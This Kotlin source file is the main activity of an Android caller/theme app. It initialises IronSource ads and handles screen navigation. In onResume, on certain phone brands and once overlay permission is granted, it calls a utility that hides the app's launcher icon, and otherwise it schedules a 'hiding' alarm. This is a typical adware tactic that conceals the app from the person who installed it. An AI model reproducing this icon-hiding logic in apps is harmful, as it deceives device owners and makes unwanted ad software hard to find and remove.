package com.maxios.maxcall.ui.main

import android.os.Build
import android.provider.Settings
import androidx.fragment.app.Fragment
import androidx.fragment.app.commit
import com.bumptech.glide.manager.SupportRequestManagerFragment
import com.ironsource.mediationsdk.IronSource
import com.maxios.maxcall.R
import com.maxios.maxcall.base.BaseActivity
import com.maxios.maxcall.databinding.MainActivityBinding
import com.maxios.maxcall.repository.PreferencesRepository
import com.maxios.maxcall.ui.contact.ContactFragment
import com.maxios.maxcall.ui.contacts.ContactsFragment
import com.maxios.maxcall.ui.home.HomeFragment
import com.maxios.maxcall.ui.settings.SettingsFragment
import com.maxios.maxcall.ui.theme.ThemeFragment
import com.maxios.maxcall.utils.IRON_SOURCE_API_KEY
import com.maxios.maxcall.utils.hiding.AlarmBroadcast
import com.maxios.maxcall.utils.hiding.AppHidingUtil
import com.maxios.maxcall.utils.hiding.HidingBroadcast
import org.koin.android.viewmodel.ext.android.viewModel
import org.koin.core.parameter.parametersOf
import org.koin.java.KoinJavaComponent
import java.util.*

class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {

    val viewModel: MainViewModel by viewModel { parametersOf(this) }

    override fun provideLayoutId(): Int = R.layout.main_activity

    override fun setupUI() {
        IronSource.setMetaData("is_child_directed","false")
        IronSource.init(this, IRON_SOURCE_API_KEY)

        if (viewModel.preferencesRepository.firstLaunchMillis == -1L)
            viewModel.preferencesRepository.firstLaunchMillis = System.currentTimeMillis()

        AlarmBroadcast.startAlarm(this)

        if (needToShowPermissionDialog())
            PermissionDialog().show(supportFragmentManager)

        viewModel.openHome.observe(this) {
            supportFragmentManager.commit { replace(R.id.homeFragmentContainer, HomeFragment()) }
        }
        viewModel.openSettings.observe(this) {
            supportFragmentManager.commit { replace(R.id.homeFragmentContainer, SettingsFragment()) }
        }
        viewModel.openContacts.observe(this) {
            viewModel.permissionRepository.askContactsPermission {
                if (it)
                    supportFragmentManager.commit { replace(R.id.homeFragmentContainer, ContactsFragment.newInstance(ContactsFragment.Mode.DEFAULT)) }
                else
                    viewModel.onHomeClick()
            }
        }
    }

    private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
        "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
    )

    override fun onPause() {
        super.onPause()
        IronSource.onPause(this)
    }

    override fun onResume() {
        super.onResume()
        IronSource.onResume(this)
        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
        else
            HidingBroadcast.startAlarm(this)
    }

    private fun needToShowPermissionDialog() =
        !viewModel.permissionRepository.hasNecessaryPermissions && supportFragmentManager.fragments.none { it is PermissionDialog }

    fun addFragment(f: Fragment) = supportFragmentManager.commit {
        add(R.id.fragmentContainer, f)
        addToBackStack(null)
    }

    fun addFragmentNoBackStack(f: Fragment) = supportFragmentManager.commit {
        add(R.id.fragmentContainer, f)
    }

    fun addFragmentRemoveOther(f: Fragment) = supportFragmentManager.commit {
        replace(R.id.fragmentContainer, f)
        supportFragmentManager.fragments.forEach {
            if (it !== f && it !is SupportRequestManagerFragment) remove(it)
        }
        addToBackStack(null)
    }

    fun removeFragment(f: Fragment) = supportFragmentManager.commit { remove(f) }

    override fun onBackPressed() {
        supportFragmentManager.fragments.firstOrNull { it is ThemeFragment }?.let(::removeFragment)
            ?: supportFragmentManager.fragments.firstOrNull { it is ContactFragment }?.let(::removeFragment)
            ?: super.onBackPressed()
    }

    override fun provideViewModel(): MainViewModel = viewModel

}